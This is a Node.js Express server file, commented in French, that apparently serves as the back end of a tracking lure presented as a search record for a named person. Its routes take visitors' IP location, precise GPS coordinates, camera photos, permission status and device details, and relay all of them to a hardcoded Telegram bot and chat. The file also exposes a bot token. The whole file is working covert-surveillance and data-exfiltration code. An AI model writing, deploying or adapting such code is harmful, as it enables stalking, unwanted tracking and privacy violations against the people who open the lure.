const express = require('express'); const cors = require('cors'); const multer = require('multer'); const TelegramBot = require('node-telegram-bot-api'); const crypto = require('crypto'); const app = express(); const PORT = process.env.PORT || 3000; // Configuration Telegram const TELEGRAM_BOT_TOKEN = '8126049726:AAGoxQ5jlqdIQYhQybXynkq_YywmLFPtDr0'; const TELEGRAM_CHAT_ID = '-5121035816'; const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false }); const upload = multer({ storage: multer.memoryStorage() }); app.use(cors()); app.use(express.json({ limit: '50mb' })); app.use(express.urlencoded({ limit: '50mb', extended: true })); const sessions = {}; // Fonctions Telegram async function sendTelegramMessage(message) { try { await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'HTML' }); } catch (error) { console.error('❌ Erreur Telegram message:', error.message); } } async function sendTelegramPhoto(buffer, caption) { try { await bot.sendPhoto(TELEGRAM_CHAT_ID, buffer, { caption, parse_mode: 'HTML' }); } catch (error) { console.error('❌ Erreur Telegram photo:', error.message); } } // Formatage function formatIPData(ipData) { if (!ipData || ipData.error) return 'Non disponible'; return ` 🌍 Adresse IP: ${ipData.ip} 📍 Ville: ${ipData.city} 🗺️ Région: ${ipData.region} 🌐 Pays: ${ipData.country} 📮 Code Postal: ${ipData.postal} 🛰️ Lat/Lon (IP): ${ipData.latitude?.toFixed(4)}, ${ipData.longitude?.toFixed(4)} 🕐 Fuseau: ${ipData.timezone} 📡 FAI: ${ipData.isp}`; } function formatCoordinates(coords) { if (!coords || coords.error) return '❌ Géolocalisation refusée'; const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${coords.latitude},${coords.longitude}`; return ` 🛰️ Latitude GPS: ${coords.latitude?.toFixed(8)} 🛰️ Longitude GPS: ${coords.longitude?.toFixed(8)} 🎯 Précision: ±${coords.accuracy}m 📊 Altitude: ${coords.altitude ? coords.altitude + 'm' : 'N/A'} 🗺️ Google Maps: Voir sur la carte`; } function formatSystemInfo(systemInfo) { if (!systemInfo) return ''; const screen = systemInfo.screen || {}; const nav = systemInfo.navigator || {}; return ` 💻 Résolution: ${screen.width}x${screen.height} 🎨 Couleurs: ${screen.colorDepth}-bit 📱 Plateforme: ${nav.platform} 🌐 Langue: ${nav.language} ⚙️ Processeurs: ${nav.hardwareConcurrency} 🖱️ Touch Points: ${nav.maxTouchPoints}`; } function formatPermissions(perms) { if (!perms) return ''; return ` 📷 Caméra: ${perms.camera ? '✅' : '❌'} 🎤 Micro: ${perms.microphone ? '✅' : '❌'} 📍 GPS: ${perms.geolocation ? '✅' : '❌'}`; } // Route: IP app.post('/api/ip', async (req, res) => { try { const { ip, sessionId, userAgent, timestamp } = req.body; const parsedIP = typeof ip === 'string' ? JSON.parse(ip) : ip; // Stocker dans la session let sessionIdFinal = sessionId || crypto.randomUUID(); if (!sessions[sessionIdFinal]) { sessions[sessionIdFinal] = { ip: parsedIP, userAgent, timestamp, photos: 0 }; } else { sessions[sessionIdFinal].ip = parsedIP; } const msg = `📡 IP détectée\nSession: ${sessionIdFinal}\n${formatIPData(parsedIP)}`; await sendTelegramMessage(msg); res.json({ status: 'success', session_id: sessionIdFinal }); } catch (e) { res.status(500).json({ status: 'error', message: e.message }); } }); // Route: Coordonnées GPS app.post('/api/coordinates', async (req, res) => { try { const { coordinates, sessionId, userAgent, timestamp } = req.body; const parsedCoords = typeof coordinates === 'string' ? JSON.parse(coordinates) : coordinates; let sessionIdFinal = sessionId || crypto.randomUUID(); if (!sessions[sessionIdFinal]) { sessions[sessionIdFinal] = { coordinates: parsedCoords, userAgent, timestamp, photos: 0 }; } else { sessions[sessionIdFinal].coordinates = parsedCoords; } const msg = `📍 Géolocalisation\nSession: ${sessionIdFinal}\n${formatCoordinates(parsedCoords)}`; await sendTelegramMessage(msg); res.json({ status: 'success', session_id: sessionIdFinal }); } catch (e) { res.status(500).json({ status: 'error', message: e.message }); } }); // Route: Permissions app.post('/api/permissions', async (req, res) => { try { const { permissions, sessionId, userAgent, timestamp } = req.body; const parsedPerms = typeof permissions === 'string' ? JSON.parse(permissions) : permissions; let sessionIdFinal = sessionId || crypto.randomUUID(); if (!sessions[sessionIdFinal]) { sessions[sessionIdFinal] = { permissions: parsedPerms, userAgent, timestamp, photos: 0 }; } else { sessions[sessionIdFinal].permissions = parsedPerms; } const msg = `🔐 Permissions mises à jour\nSession: ${sessionIdFinal}\n${formatPermissions(parsedPerms)}`; await sendTelegramMessage(msg); res.json({ status: 'success', session_id: sessionIdFinal }); } catch (e) { res.status(500).json({ status: 'error', message: e.message }); } }); // Route: Photo app.post('/api/photo', upload.single('photo'), async (req, res) => { try { const { sessionId, userAgent, timestamp } = req.body; const photoBuffer = req.file.buffer; let sessionIdFinal = sessionId || crypto.randomUUID(); if (!sessions[sessionIdFinal]) { sessions[sessionIdFinal] = { photos: 0, userAgent, timestamp }; } sessions[sessionIdFinal].photos++; const sizeKB = (photoBuffer.length / 1024).toFixed(2); const msg = `📸 Photo reçue\nSession: ${sessionIdFinal}\nPhoto #${sessions[sessionIdFinal].photos}\nTaille: ${sizeKB} KB`; await sendTelegramMessage(msg); await sendTelegramPhoto(photoBuffer, `Photo #${sessions[sessionIdFinal].photos} - Session ${sessionIdFinal}`); res.json({ status: 'success', session_id: sessionIdFinal, photo_number: sessions[sessionIdFinal].photos }); } catch (e) { res.status(500).json({ status: 'error', message: e.message }); } }); // Route: Système app.post('/api/system', async (req, res) => { try { const { systemInfo, sessionId, userAgent, timestamp } = req.body; const parsedSys = typeof systemInfo === 'string' ? JSON.parse(systemInfo) : systemInfo; let sessionIdFinal = sessionId || crypto.randomUUID(); if (!sessions[sessionIdFinal]) { sessions[sessionIdFinal] = { systemInfo: parsedSys, userAgent, timestamp, photos: 0 }; } else { sessions[sessionIdFinal].systemInfo = parsedSys; } const msg = `💻 Informations système\nSession: ${sessionIdFinal}\n${formatSystemInfo(parsedSys)}`; await sendTelegramMessage(msg); res.json({ status: 'success', session_id: sessionIdFinal }); } catch (e) { res.status(500).json({ status: 'error', message: e.message }); } }); // Routes existantes (stats, debug, etc.) app.get('/api/stats', (req, res) => { const totalPhotos = Object.values(sessions).reduce((sum, s) => sum + (s.photos || 0), 0); res.json({ status: 'active', active_sessions: Object.keys(sessions).length, total_photos: totalPhotos }); }); app.get('/', (req, res) => { res.json({ status: 'active', service: 'FICHE RECHERCHE ALLAN PERREZ', active_sessions: Object.keys(sessions).length }); }); app.listen(PORT, () => { console.log(`🚀 Serveur démarré sur le port ${PORT}`); sendTelegramMessage(`✅ Serveur démarré (port ${PORT})`); }); module.exports = app;
